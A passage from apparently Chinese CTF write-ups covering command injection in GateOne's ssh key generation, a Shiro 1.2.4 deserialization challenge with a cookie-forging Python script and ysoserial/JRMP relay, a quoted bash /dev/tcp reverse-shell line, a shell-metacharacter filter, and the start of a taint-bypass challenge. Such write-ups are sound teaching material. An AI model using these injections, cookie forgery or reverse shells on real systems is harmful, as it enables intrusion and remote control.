<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bad_chars</span><span class="params">(chars)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> re</span><br><span class="line">    bad_chars = re.compile(<span class="string">'.*[\$\n\!\;&amp;` |&lt;&gt;].*'</span>)</span><br><span class="line">    <span class="keyword">if</span> bad_chars.match(chars):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> validated:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        url = raw_input(_(</span><br><span class="line">            <span class="string">"[Press Shift-F1 for help]\n\nHost/IP or ssh:// URL%s: "</span> %</span><br><span class="line">            default_host_str))</span><br><span class="line">    <span class="keyword">if</span> bad_chars(url):</span><br><span class="line">        raw_input(invalid_hostname_err)</span><br><span class="line">        url = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="keyword">if</span> options.default_host:</span><br><span class="line">            host = options.default_host</span><br><span class="line">            protocol = <span class="string">'ssh'</span></span><br><span class="line">            validated = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            raw_input(invalid_hostname_err)</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<p>但是这个不仅仅有个 ssh 链接的功能, 还能生成 ssh 秘钥,  </p>
<p><img src="https://i.loli.net/2019/08/26/s7pjlYCm6RLKhPV.png" alt="">  </p>
<p>我们仔细来看这个 <code>gateone/applications/terminal/plugins/ssh/ssh.py</code> 第 615 行 <code>generate_new_keypair</code>,  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> which(<span class="string">'ssh-keygen'</span>): <span class="comment"># Prefer OpenSSH</span></span><br><span class="line">    openssh_generate_new_keypair(</span><br><span class="line">        self,</span><br><span class="line">        name, <span class="comment"># Name to use when generating the keypair</span></span><br><span class="line">        users_ssh_dir, <span class="comment"># Path to save it</span></span><br><span class="line">        keytype=keytype,</span><br><span class="line">        passphrase=passphrase,</span><br><span class="line">        bits=bits,</span><br><span class="line">        comment=comment</span><br><span class="line">    )</span><br><span class="line"><span class="keyword">elif</span> which(<span class="string">'dropbearkey'</span>):</span><br><span class="line">    dropbear_generate_new_keypair(self,</span><br><span class="line">        name, <span class="comment"># Name to use when generating the keypair</span></span><br><span class="line">        users_ssh_dir, <span class="comment"># Path to save it</span></span><br><span class="line">        keytype=keytype,</span><br><span class="line">        passphrase=passphrase,</span><br><span class="line">        bits=bits,</span><br><span class="line">        comment=comment)</span><br></pre></td></tr></table></figure>

<p>会判断用的是 openssh 或者 dropbear 来调用对应的秘钥生成命令, 这里肯定是 openssh, 来到 699 行 <code>openssh_generate_new_keypair</code>, 可以看到  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">openssh_generate_new_keypair</span><span class="params">(self, name, path,</span></span></span><br><span class="line"><span class="function"><span class="params">        keytype=None, passphrase=<span class="string">""</span>, bits=None, comment=<span class="string">""</span>)</span>:</span></span><br><span class="line">    self.ssh_log.debug(<span class="string">'openssh_generate_new_keypair()'</span>)</span><br><span class="line">    openssh_version = shell_command(<span class="string">'ssh -V'</span>)[<span class="number">1</span>]</span><br><span class="line">    ssh_major_version = int(</span><br><span class="line">        openssh_version.split()[<span class="number">0</span>].split(<span class="string">'_'</span>)[<span class="number">1</span>].split(<span class="string">'.'</span>)[<span class="number">0</span>])</span><br><span class="line">    key_path = os.path.join(path, name)</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    ssh_keygen_path = which(<span class="string">'ssh-keygen'</span>)</span><br><span class="line">    command = (</span><br><span class="line">        <span class="string">"%s "</span>       <span class="comment"># Path to ssh-keygen</span></span><br><span class="line">        <span class="string">"-b %s "</span>    <span class="comment"># bits</span></span><br><span class="line">        <span class="string">"-t %s "</span>    <span class="comment"># keytype</span></span><br><span class="line">        <span class="string">"-C '%s' "</span>  <span class="comment"># comment</span></span><br><span class="line">        <span class="string">"-f '%s'"</span>   <span class="comment"># Key path</span></span><br><span class="line">        % (ssh_keygen_path, bits, keytype, comment, key_path)</span><br><span class="line">    )</span><br><span class="line">    self.ssh_log.debug(<span class="string">"Keygen command: %s"</span> % command)</span><br><span class="line">    m = self.new_multiplex(command, <span class="string">"gen_ssh_keypair"</span>)</span><br></pre></td></tr></table></figure>
<p>同样是拼的命令, 不同的是没有了过滤. 因为 name 可控, 最后导致 keypath 可控, 我们只需要注入一个 <code>&#39;;some cmd;&#39;</code> 就能注入我们自己的命令了.  </p>
<p>这里可以用 Burpsuite 来改 websocket 的内容  </p>
<p><img src="https://i.loli.net/2019/08/26/wPzJEIvnuGDHyqj.png" alt=""></p>
<p>然后结合之前的任意文件读取来读命令执行的结果    </p>
<p><img src="https://i.loli.net/2019/08/26/PctX1T9qjbD7KM2.png" alt=""></p>
<p>然后就可以发现 flag 啦, 可以直接读. 另外, 除了这个地方还有其他地方也有同样的问题, 这里不再一一举出. </p>
]]></content>
      <tags>
        <tag>web</tag>
        <tag>audit</tag>
      </tags>
  </entry>
  <entry>
    <title>OGeek 线下 Java Web And XCTF Final babytaint Writeup</title>
    <url>/2019/10/31/OGeek-%E7%BA%BF%E4%B8%8B-Java-Web-And-XCTF-Final-babytaint-Writeup/</url>
    <content><![CDATA[<p>因为最近课程非常非常多, 还顺带考试 + 实验报告, 咕咕咕掉了许多比赛, 真正去的也只有 OGeek, 其他都是云比赛.<br>拿做出来的题目里面选两题写个 Writeup 吧, 不然太久没更新了 (逃</p>
<a id="more"></a>

<h2 id="Java-Web"><a href="#Java-Web" class="headerlink" title="Java Web"></a>Java Web</h2><p>这题运气比较好, 拿了一血<br>拿到题目可以看到一堆 jsp, 可以确定是 java web.  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ tree -L 2 . --dirsfirst</span><br><span class="line">.</span><br><span class="line">├── css</span><br><span class="line">│   ├── main.css</span><br><span class="line">│   └── util.css</span><br><span class="line">├── fonts</span><br><span class="line">│   ├── font-awesome-4.7.0</span><br><span class="line">│   ├── iconic</span><br><span class="line">│   └── poppins</span><br><span class="line">├── images</span><br><span class="line">│   ├── icons</span><br><span class="line">│   └── bg-01.jpg</span><br><span class="line">├── js</span><br><span class="line">│   └── main.js</span><br><span class="line">├── META-INF</span><br><span class="line">│   └── MANIFEST.MF</span><br><span class="line">├── vendor</span><br><span class="line">│   ├── animate</span><br><span class="line">│   ├── animsition</span><br><span class="line">│   ├── bootstrap</span><br><span class="line">│   ├── countdowntime</span><br><span class="line">│   ├── css-hamburgers</span><br><span class="line">│   ├── daterangepicker</span><br><span class="line">│   ├── jquery</span><br><span class="line">│   ├── perfect-scrollbar</span><br><span class="line">│   └── select2</span><br><span class="line">├── WEB-INF</span><br><span class="line">│   ├── classes</span><br><span class="line">│   ├── lib</span><br><span class="line">│   └── web.xml</span><br><span class="line">├── error.jsp</span><br><span class="line">├── index.jsp</span><br><span class="line">├── login.jsp</span><br><span class="line">└── success.jsp</span><br></pre></td></tr></table></figure>

<p>逻辑比较简单, 漏洞也不在这些 jsp 里面</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%<span class="meta">@taglib</span> prefix=<span class="string">"shiro"</span> uri=<span class="string">"http://shiro.apache.org/tags"</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Login V3&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span><br><span class="line">    &lt;!--===============================================================================================--&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"icon"</span> type=<span class="string">"image/png"</span> href=<span class="string">"images/icons/favicon.ico"</span>/&gt;</span><br><span class="line">    &lt;!--===============================================================================================--&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"vendor/bootstrap/css/bootstrap.min.css"</span>&gt;</span><br><span class="line">    &lt;!--===============================================================================================--&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"fonts/font-awesome-4.7.0/css/font-awesome.min.css"</span>&gt;</span><br><span class="line">    &lt;!--===============================================================================================--&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"fonts/iconic/css/material-design-iconic-font.min.css"</span>&gt;</span><br><span class="line">    &lt;!--===============================================================================================--&gt;</span><br><span class="line">&lt;!-- 省略掉一些 html --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">&lt;form action=<span class="string">"/register"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"username"</span> value=<span class="string">""</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"password"</span> value=<span class="string">""</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"submit"</span>&gt;&lt;br&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到 shiro, 注意 <code>WEB-INF/lib/</code> 里面的 <code>shiro-core-1.2.4.jar</code> 是存在漏洞的版本, 可以利用 java 反序列化执行命令.<br>遂直接用了之前的找的 exp, 但是 JRMPClient 并没有回连的反应, 再看看 web.xml</p>
<p>web.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param-value</span>&gt;</span></span><br><span class="line">    classpath:spring-shiro.xml</span><br><span class="line">  <span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>shiroFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.DelegatingFilterProxy<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">async-supported</span>&gt;</span>true<span class="tag">&lt;/<span class="name">async-supported</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>targetFilterLifecycle<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>shiroFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>找到 WEB-INF/classes/spring-shiro.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 省略掉一些没用的配置 --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- rememberMe管理器 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"rememberMeManager"</span> <span class="attr">class</span>=<span class="string">"com.collection.shiro.manager.ShiroRememberManager"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"cookie"</span> <span class="attr">ref</span>=<span class="string">"rememberMeCookie"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 省略掉一些没用的配置 --&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到出题人用了自己实现的 rememberMeManager, 我们掏出 jd-gui 看看.</p>
<p>WEB-INF/classes/com/collection/shiro/manager/ShiroRememberManager.class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">byte</span>[] getKeyFromConfig() &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        InputStream fileInputStream = getClass().getResourceAsStream(<span class="string">"remember.key"</span>);</span><br><span class="line">        String key = <span class="string">""</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (fileInputStream == <span class="keyword">null</span> || fileInputStream.available() &lt; <span class="number">32</span>) &#123;</span><br><span class="line">        BufferedWriter writer = <span class="keyword">new</span> BufferedWriter(<span class="keyword">new</span> FileWriter(getClass().getResource(<span class="string">"/"</span>).getPath() + <span class="string">"com/collection/shiro/manager/remember.key"</span>));</span><br><span class="line">        key = RandomStringUtils.random(<span class="number">32</span>, <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()_="</span>);</span><br><span class="line">        writer.write(key);</span><br><span class="line">        writer.close();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[fileInputStream.available()];</span><br><span class="line">        fileInputStream.read(bytes);</span><br><span class="line">        key = <span class="keyword">new</span> String(bytes);</span><br><span class="line">        fileInputStream.close();</span><br><span class="line">        &#125; </span><br><span class="line">        key = (<span class="keyword">new</span> Md5Hash(key)).toString();</span><br><span class="line">        <span class="keyword">return</span> key.getBytes();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>WEB-INF/classes/com/collection/shiro/crypto/ShiroCipherService.class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShiroCipherService</span> <span class="keyword">implements</span> <span class="title">CipherService</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> ByteSource <span class="title">decrypt</span><span class="params">(<span class="keyword">byte</span>[] ciphertext, <span class="keyword">byte</span>[] key)</span> <span class="keyword">throws</span> CryptoException </span>&#123;</span><br><span class="line">    String skey = (<span class="keyword">new</span> Sha1Hash(<span class="keyword">new</span> String(key))).toString();</span><br><span class="line">    <span class="keyword">byte</span>[] bkey = skey.getBytes();</span><br><span class="line">    <span class="keyword">byte</span>[] data_bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[ciphertext.length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ciphertext.length; i++) &#123;</span><br><span class="line">      data_bytes[i] = (<span class="keyword">byte</span>)(ciphertext[i] ^ bkey[i % bkey.length]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">byte</span>[] jsonData = <span class="keyword">new</span> <span class="keyword">byte</span>[ciphertext.length / <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; jsonData.length; i++) &#123;</span><br><span class="line">      jsonData[i] = (<span class="keyword">byte</span>)(data_bytes[i * <span class="number">2</span>] ^ data_bytes[i * <span class="number">2</span> + <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    JSONObject jsonObject = <span class="keyword">new</span> JSONObject(<span class="keyword">new</span> String(jsonData));</span><br><span class="line">    String serial = (String)jsonObject.get(<span class="string">"serialize_data"</span>);</span><br><span class="line">    <span class="keyword">return</span> ByteSource.Util.bytes(Base64.getDecoder().decode(serial));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> ByteSource <span class="title">encrypt</span><span class="params">(<span class="keyword">byte</span>[] plaintext, <span class="keyword">byte</span>[] key)</span> <span class="keyword">throws</span> CryptoException </span>&#123;</span><br><span class="line">    String sign = (<span class="keyword">new</span> Md5Hash(UUID.randomUUID().toString())).toString() + <span class="string">"asfda-92u134-"</span>;</span><br><span class="line">    Subject subject = SecurityUtils.getSubject();</span><br><span class="line">    HttpServletRequest servletRequest = WebUtils.getHttpRequest(subject);</span><br><span class="line">    String user_agent = servletRequest.getHeader(<span class="string">"User-Agent"</span>);</span><br><span class="line">    String ip_address = servletRequest.getHeader(<span class="string">"X-Forwarded-For"</span>);</span><br><span class="line">    ip_address = (ip_address == <span class="keyword">null</span>) ? servletRequest.getRemoteAddr() : ip_address;</span><br><span class="line">    String data = <span class="string">"&#123;\"user_is_login\":\"1\",\"sign\":\""</span> + sign + <span class="string">"\",\"ip_address\":\""</span> + ip_address + <span class="string">"\",\"user_agent\":\""</span> + user_agent + <span class="string">"\",\"serialize_data\":\""</span> + Base64.getEncoder().encodeToString(plaintext) + <span class="string">"\"&#125;"</span>;</span><br><span class="line">    <span class="keyword">byte</span>[] data_bytes = data.getBytes();</span><br><span class="line">    <span class="keyword">byte</span>[] okey = (<span class="keyword">new</span> Sha1Hash(<span class="keyword">new</span> String(key))).toString().getBytes();</span><br><span class="line">    <span class="keyword">byte</span>[] mkey = (<span class="keyword">new</span> Sha1Hash(UUID.randomUUID().toString())).toString().getBytes();</span><br><span class="line">    <span class="keyword">byte</span>[] out = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2</span> * data_bytes.length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; data_bytes.length; i++) &#123;</span><br><span class="line">      out[i * <span class="number">2</span>] = mkey[i % mkey.length];</span><br><span class="line">      out[i * <span class="number">2</span> + <span class="number">1</span>] = (<span class="keyword">byte</span>)(mkey[i % mkey.length] ^ data_bytes[i]);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">byte</span>[] result = <span class="keyword">new</span> <span class="keyword">byte</span>[out.length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; out.length; i++) &#123;</span><br><span class="line">      result[i] = (<span class="keyword">byte</span>)(out[i] ^ okey[i % okey.length]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ByteSource.Util.bytes(result);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>这相当于魔改了原版的 shiro, 原版的是直接用的 AES. 我们可以看到这里魔改后秘钥是读的 <code>com/collection/shiro/manager/remember.key</code>. (docker 初始自带一个 key, 所有人都用的一个, 不会自己生成).<br>然后算法也从 AES 变成了出题人手写的加密算法. 然后将序列化后的对象 base64 之后放在了 json 的 <code>serialize_data</code> 里面<br>我们可以写个脚本二次重写一下 ysoserial 生成的 payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> dumps</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/home/rmb122/repos/ysoserial/target/1.bin'</span></span><br><span class="line">payload = open(payload, <span class="string">'rb'</span>).read()</span><br><span class="line">payload = b64encode(payload).decode()</span><br><span class="line">data = &#123;<span class="string">"user_is_login"</span>: <span class="string">"1"</span>, <span class="string">"sign"</span>: <span class="string">"9368b2d39093ed7164841e4050f9cdbeasfda-92u134-"</span>, <span class="string">"ip_address"</span>: <span class="string">"10.10.19.245"</span>, <span class="string">"user_agent"</span>: <span class="string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36"</span>,</span><br><span class="line"><span class="string">"serialize_data"</span>: payload&#125;</span><br><span class="line">data = dumps(data).encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">"wR&amp;_(NVG#c&amp;9(CDhaDMZELDmxSe(mwbB"</span></span><br><span class="line">k = md5(key.encode()).hexdigest()</span><br><span class="line">k = sha1(k.encode()).hexdigest().encode()</span><br><span class="line"></span><br><span class="line">newdata = bytearray()</span><br><span class="line">newdata_2 = bytearray()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    newdata.append(i)</span><br><span class="line">    newdata.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(newdata)):</span><br><span class="line">    newdata_2.append(newdata[i] ^ k[i % len(k)])</span><br><span class="line"></span><br><span class="line">print(b64encode(newdata_2))</span><br></pre></td></tr></table></figure>

<p>然后直接改到 rememberMe 的 Cookie 上就行了, 尝试了几个 payload 因为 Cookie 是有长度限制的, 平常是直接将序列化数据 base64 贴上去所以不会超出限制. 这里双重 base64 加上加密还得带一个 xor key 导致很多 payload 就不能直接用了. 所以我们这里还是用 JRMPClient 来中转一下, 在自己的机器上跑一个 ysoserial.exploit.JRMPListener 就 ok 了.</p>
<p>这里需要注意原版的 ysoserial 是直接用的 <code>java.Runtime.getRuntime().exec(payload)</code>, 相当于 <code>execv(payload.split(&#39; &#39;))</code>, 会导致 <code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.0.19.3/7777 0&gt;&amp;1&quot;</code> 之类的不能用, 这里当时是用了别的命令利用的漏洞. 赛后 fork 了 <a href="https://github.com/rmb122/ysoserial" target="_blank" rel="noopener">ysoserial</a> 改了下, 用的 <code>java.Runtime.getRuntime().exec(new String[]{})</code> 就能直接弹 shell 之类的.</p>
<h2 id="XCTF-Final-babytaint-Writeup"><a href="#XCTF-Final-babytaint-Writeup" class="headerlink" title="XCTF Final babytaint Writeup"></a>XCTF Final babytaint Writeup</h2><p>拿到手先 Google <code>jalangi2</code> 是个啥, 可以搜到是个可以 hook javascript 各种操作的库. 这里是拿来搞了污点分析.<br>如果之前了解过一些编译原理和 PHP 的 taint 拓展, 那这道题确实挺简单的. 本质就是从 /dev/urandom/ 里面获取随机字节作为 secret, 题目 hook 了 “Source”() 的调用, 返回了 taint 过的 secret, 你需要通过某种方法 bypass 掉这个 taint. 也就是将污点去除.<br>我们看一下源码, 关键就是这个</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AnnotatedValue</span>(<span class="params">val, shadow</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.val = val;</span><br><span class="line">		<span class="keyword">this</span>.shadow = shadow;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>这个就是一个包装类, 用 shadow 来记录是否是 taint 过的值. 题目 hook 住了所有计算, 拿二元计算来看</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.binary = <span class="function"><span class="keyword">function</span>(<span class="params">iid, op, left, right, result</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">const</span> aleft = actual(left);</span><br><span class="line">		<span class="keyword">const</span> aright = actual(right);</span><br><span class="line">		<span class="keyword">switch</span> (op)</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"+"</span>:</span><br><span class="line">			result = aleft + aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"-"</span>:</span><br><span class="line">			result = aleft - aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"*"</span>:</span><br><span class="line">			result = aleft * aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"/"</span>:</span><br><span class="line">			result = aleft / aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"%"</span>:</span><br><span class="line">			result = aleft % aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"&lt;&lt;"</span>:</span><br><span class="line">			result = aleft &lt;&lt; aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"&gt;&gt;"</span>:</span><br><span class="line">			result = aleft &gt;&gt; aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"&gt;&gt;&gt;"</span>:</span><br><span class="line">			result = aleft &gt;&gt;&gt; aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"&lt;"</span>:</span><br><span class="line">			result = aleft &lt; aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"&gt;"</span>:</span><br><span class="line">			result = aleft &gt; aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"&lt;="</span>:</span><br><span class="line">			result = aleft &lt;= aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"&gt;="</span>:</span><br><span class="line">			result = aleft &gt;= aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"=="</span>:</span><br><span class="line">			result = aleft == aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"!="</span>:</span><br><span class="line">			result = aleft != aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"==="</span>:</span><br><span class="line">			result = aleft === aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"!=="</span>:</span><br><span class="line">			result = aleft !== aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"&amp;"</span>:</span><br><span class="line">			result = aleft &amp; aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"|"</span>:</span><br><span class="line">			result = aleft | aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"^"</span>:</span><br><span class="line">			result = aleft ^ aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"delete"</span>:</span><br><span class="line">			result = <span class="keyword">delete</span> aleft[aright];</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"instanceof"</span>:</span><br><span class="line">			result = aleft <span class="keyword">instanceof</span> aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"in"</span>:</span><br><span class="line">			result = aleft <span class="keyword">in</span> aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			errExit(op + <span class="string">" at "</span> + iid + <span class="string">" not found"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> &#123;<span class="attr">result</span>: <span class="keyword">new</span> AnnotatedValue(result,</span><br><span class="line">			shadow(left) || shadow(right))&#125;;</span><br><span class="line">	&#125;;</span><br></pre></td></tr></table></figure>
<p>只要两个运算符有一个是 taint 过的, 返回的也是 taint 过的值. 同时我们想要拿到 flag, 需要调用 “Sink”(secret), 但是输入的 secret  </p>
